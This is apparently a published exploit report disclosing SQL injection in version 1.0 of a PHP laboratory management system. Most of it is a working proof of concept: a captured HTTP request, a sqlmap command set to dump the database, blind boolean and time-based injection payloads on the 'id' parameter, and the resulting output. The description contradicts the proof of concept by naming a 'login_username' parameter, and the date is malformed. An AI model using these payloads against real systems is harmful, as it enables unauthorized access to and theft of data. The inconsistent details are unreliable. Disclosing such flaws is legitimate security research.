# Laboratory Management System - SQL Injection
+ **Exploit Title:** Laboratory Management System - SQL Injection
+ **Date:** 2024-27-03
+ **Exploit Author:** Burak Sevben
+ **Vendor Homepage:** https://www.sourcecodester.com/php/17268/computer-laboratory-management-system-using-php-and-mysql.html
+ **Software Link:** https://www.sourcecodester.com/download-code?nid=17268&title=Computer+Laboratory+Management+System+using+PHP+and+MySQL
+ **Version:** 1.0
+ **Tested on:** Kali Linux + PHP 8.2.12, Apache 2.4.58
+ **CVE:** Reported, waiting for CVE number.

## Description:
Laboratory Management System 1.0 allows SQL Injection via the 'login_username' parameter at "localhost/php-lms/admin/?page=borrow/view_borrow&id=1". 
Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit the latest vulnerabilities in the underlying database.

## Proof of Concept:
+ Go to this address: "http://localhost/php-lms/admin/"
+ Select any recodrs then click view button
+ Capture the request via Burp Suite and send it to the Repeater.
+ Copy the request and paste it into an "r.txt" file.
+ Captured Burp request:

```
GET /php-lms/admin/?page=borrow/view_borrow&id=1 HTTP/1.1
Host: localhost
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Upgrade-Insecure-Requests: 1
```

+ Use sqlmap to exploit. In sqlmap, use 'id' parameter to dump the database.
```
sqlmap -r r.txt -p id --risk 3 --level 5 --dbms mysql --proxy="http://127.0.0.1:8080" --batch --current-db
```
```
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: page=borrow/view_borrow&id=1' AND 4852=(SELECT (CASE WHEN (4852=4852) THEN 4852 ELSE (SELECT 6337 UNION SELECT 3697) END))-- -

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: page=borrow/view_borrow&id=1' AND (SELECT 9348 FROM (SELECT(SLEEP(5)))TShs)-- ekqD
---
[09:26:47] [INFO] the back-end DBMS is MySQL
web application technology: Apache 2.4.58, PHP 8.2.12
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[09:26:47] [INFO] fetching current database
[09:26:47] [INFO] retrieving the length of query output
[09:26:47] [INFO] retrieved: 6
[09:26:48] [INFO] retrieved: lms_db           
current database: 'lms_db'
```
+ current database: `lms_db`

![Ekran görüntüsü 2024-03-27 162809](https://github.com/BurakSevben/CVEs/assets/117217689/eba62b4c-520d-4899-8893-97a813a5ebc2)
